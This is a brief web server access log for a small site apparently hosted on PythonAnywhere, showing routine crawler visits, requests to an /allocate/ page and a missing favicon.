207.46.13.39 - - [17/Jan/2023:11:50:51 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" "207.46.13.39" response-time=0.007
40.77.167.52 - - [17/Jan/2023:13:47:29 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" "40.77.167.52" response-time=5.872
104.47.55.254 - - [17/Jan/2023:18:56:17 +0000] "HEAD /allocate/ HTTP/1.1" 200 0 "-" "-" "104.47.55.254" response-time=0.538
75.76.111.92 - - [17/Jan/2023:18:56:17 +0000] "GET /allocate/ HTTP/1.1" 200 2495 "https://usc-word-edit.officeapps.live.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" "75.76.111.92" response-time=0.055
75.76.111.92 - - [17/Jan/2023:18:56:18 +0000] "GET /favicon.ico HTTP/1.1" 404 952 "https://breakoutroom.pythonanywhere.com/allocate/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" "75.76.111.92" response-time=0.093
